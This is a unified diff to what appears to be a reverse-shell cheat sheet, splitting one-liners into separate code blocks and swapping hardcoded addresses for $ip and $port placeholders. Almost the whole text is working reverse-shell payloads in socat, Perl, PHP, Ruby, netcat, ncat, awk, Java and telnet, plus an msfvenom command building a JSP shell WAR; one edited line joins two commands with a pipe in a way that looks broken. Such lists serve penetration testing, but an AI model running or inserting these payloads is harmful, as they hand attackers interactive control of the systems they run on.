@@ -63,18 +63,19 @@ ksh -i >& /dev/udp/$ip/$port 0>&1
 ```
 
 ```socat
-user@attack$ socat file:`tty`,raw,echo=0 TCP-L:$port
-user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port
+/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port
 ```
 
 ```perl
 perl -e 'use Socket;$i="$ip";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
-perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```perl
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$ip:$port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```
 
-
-NOTE: Windows only
-perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+```perl
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$ip:$port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 
 ```python
@@ -147,10 +148,25 @@ python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$ip', $port))
 
 ```php
 php -r '$sock=fsockopen("$ip",$port);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+```php
 php -r '$sock=fsockopen("$ip",$port);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+```php
 php -r '$sock=fsockopen("$ip",$port);`/bin/sh -i <&3 >&3 2>&3`;'
+```
+
+```php
 php -r '$sock=fsockopen("$ip",$port);system("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+```php
 php -r '$sock=fsockopen("$ip",$port);passthru("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+```php
 php -r '$sock=fsockopen("$ip",$port);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
 ```
 
@@ -160,10 +176,13 @@ php -r '$sock=fsockopen("$ip",$port);$proc=proc_open("/bin/sh -i", array(0=>$soc
 
 ```ruby
 ruby -rsocket -e'f=TCPSocket.open("$ip",$port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
 
+```ruby
 ruby -rsocket -e'exit if fork;c=TCPSocket.new("$ip","$port");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
+```
 
-NOTE: Windows only
+```ruby
 ruby -rsocket -e 'c=TCPSocket.new("$ip","$port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
@@ -173,7 +192,13 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 
 ```nc
 nc -e /bin/sh $ip $port
+```
+
+```nc
 nc -e /bin/bash $ip $port
+```
+
+```nc
 nc -c bash $ip $port
 ```
 
@@ -187,6 +212,9 @@ rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f
 
 ```ncat
 ncat $ip $port -e /bin/bash
+```
+
+```ncat
 ncat --udp $ip $port -e /bin/bash
 ```
 
@@ -214,7 +242,6 @@ awk 'BEGIN {s = "/inet/tcp/0/$ip/$port"; while(42) { do{ printf "shell>" |& s; s
 Runtime r = Runtime.getRuntime();
 Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do $line 2>&5 >&5; done'");
 p.waitFor();
-
 ```
 
 ```java
@@ -222,21 +249,14 @@ String host="$ip";
 int port=$port;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-
 ```
 
 ```telnet
-In Attacker machine start two listeners:
-nc -lvp 8080
-nc -lvp 8081
-
-In Victime machine run below command:
 telnet $ip $port | /bin/sh | telnet $ip 8081
 ```
 
 ```war
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > reverse.war
-strings reverse.war | grep jsp # in order to get the name of the file
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > reverse.war | strings reverse.war | grep jsp # in order to get the name of the file
 ```
 
 ```lua
